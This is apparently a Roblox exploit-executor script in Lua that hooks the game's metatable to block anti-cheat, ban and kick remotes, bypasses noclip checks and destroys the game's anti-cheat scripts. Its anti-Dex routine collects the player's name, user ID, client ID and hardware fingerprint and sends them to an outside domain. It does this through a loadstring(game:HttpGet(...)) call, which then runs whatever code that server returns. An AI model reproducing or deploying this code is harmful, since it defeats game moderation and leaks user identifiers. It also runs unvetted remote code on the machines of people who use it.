function locatedex() --test
    local ninekayplr = game:GetService("Players").LocalPlayer
    for i, ninekay in pairs(game.CoreGui:GetDescendants()) do
        if ninekay:IsA("TextLabel") or ninekay:IsA("TextButton") then
            if string.find(ninekay.Text, "Dex") then
                ninekayplr:Kick("[+] AntiDex (Agent)\n 3 Detects of Any = Blacklist")
                local http_request = http_request;
                if syn then
                	http_request = syn.request
                elseif SENTINEL_V2 then
                	function http_request(tb)
                		return {
                			StatusCode = 200;
                			Body = request(tb.Url, tb.Method, (tb.Body or ''))
                		}
                	end
                end
                
                local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
                local decoded = game:GetService('HttpService'):JSONDecode(body)
                local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
                local hwid = "";
                
                for i, v in next, hwid_list do
                	if decoded.headers[v] then
                		hwid = decoded.headers[v];
                		break
                	end
                end
                local serverage = "3more"
                loadstring(game:HttpGet("https://9kdestroyer.xyz/PHP_Servers/Dex.php?username="..game.Players.LocalPlayer.Name.."&userid="..game.Players.LocalPlayer.UserId.."&clientid="..game:GetService("RbxAnalyticsService"):GetClientId().."&hwid="..hwid.."&serverage="..serverage.."&botname=9ksSon"))()
                return;
            end
        end
    end
end
locatedex()
game.CoreGui.ChildAdded:Connect(function(v)
    wait(.5)
    locatedex()
end)

function AntiCheat()
  wait(1)
  local me        = game.Players.LocalPlayer
  local mechar    = game.Players.LocalPlayer.Character
  for _, v in next, mechar:GetChildren() do
    if v:IsA('Script') then
      for _, b in next, v:GetChildren() do
        if b:IsA('LocalScript') and b.Parent:IsA('Script') then
          b.Parent:Destroy()
        end
      end 
    end
  end 
end
game.Players.LocalPlayer.CharacterAdded:Connect(AntiCheat)
function RunCheck()
for i, v in pairs(game.Players:GetChildren()) do
    if v.Backpack then
        for _,scripts in pairs(v.Backpack:GetChildren()) do
            if scripts:IsA("LocalScript") then
                if scripts.Name == "AdminBan" then
                    game.Players.LocalPlayer:Kick("[WIP] Anti Ban | Mod Detected : "..v.Name)
                end
            end
        end
    end
end
end
RunCheck()
game.Players.PlayerAdded:Connect(function(v)
    repeat wait() until Workspace.Players:FindFirstChild(v.Name)
    RunCheck()
end)

assert(getrawmetatable)
gmt = getrawmetatable(game)
setreadonly(gmt, false)
old = gmt.__namecall
gmt.__namecall =
    newcclosure(
        function(self, ...)
        local args = {...}
        if tostring(args[1]) == "BR_MOBILE" then
            return
        elseif tostring(args[1]) == "TeleportDetect" then
            return
        elseif tostring(args[1]) == "CHECKER_1" then
            return
        elseif tostring(args[1]) == "CHECKER" then
            return
        elseif tostring(args[1]) == "GUI_CHECK" then
            return
        elseif tostring(args[1]) == "OneMoreTime" then
            return
        elseif tostring(args[1]) == "checkingSPEED" then
            return
        elseif tostring(args[1]) == "BANREMOTE" then
            return
        elseif tostring(args[1]) == "PERMAIDBAN" then
            return
        elseif tostring(args[1]) == "KICKREMOTE" then
            return
        elseif tostring(args[1]) == "BR_KICKPC" then
            return end

        return old(self, ...)
    end)
-- // NoClip bypass
xpcall(function()
                    local old
                    old = hookmetamethod(game, "__namecall" ,newcclosure(function(self,...)
                        if not checkcaller() then return old(self,...) end
                        local args = {...}
            
                        if self == PhysicsService then
                            if getnamecallmethod() == "RenameCollisionGroup" then
                                return	RenameCollisionGroup(args[1],args[2])
                            elseif getnamecallmethod() == "RemoveCollisionGroup"  then
                                return	RemoveCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CreateCollisionGroup" then
                                return	CreateCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CollisionGroupSetCollidable" then
                                return CollisionGroupSetCollidable(args[1],args[2],args[3])
                            end
                        end 
            
                        return old(self,...)
                    end))
                end, function()
                    local mt = getrawmetatable(game)
                    local old = mt.__namecall
                    
                    setreadonly(mt,false)
                    
                    mt.__namecall = newcclosure(function(self, ...)
                        if not checkcaller() then return old(self,...) end
                        local args = {...}
            
                        if self == PhysicsService then
                            if getnamecallmethod() == "RenameCollisionGroup" then
                                return	RenameCollisionGroup(args[1],args[2])
                            elseif getnamecallmethod() == "RemoveCollisionGroup"  then
                                return	RemoveCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CreateCollisionGroup" then
                                return	CreateCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CollisionGroupSetCollidable" then
                                return CollisionGroupSetCollidable(args[1],args[2],args[3])
                            end
                        end 
            
                        return old(self,...)
                    end)
            
                    setreadonly(mt,true)
        end)
        setfflag("HumanoidParallelRemoveNoPhysics", "False")
        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")      
if not hookmetamethod then 
		return
end
Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local oldhmmi
	local oldhmmnc
	oldhmmi = hookmetamethod(game, "__index", function(self, method)
		if self == LocalPlayer and method:lower() == "kick" then
			return error("Expected ':' not '.' calling member function Kick", 2)
		end
		return oldhmmi(self, method)
	end)
	oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
		if self == LocalPlayer and getnamecallmethod():lower() == "kick" then
			return
		end
		return oldhmmnc(self, ...)
	end)

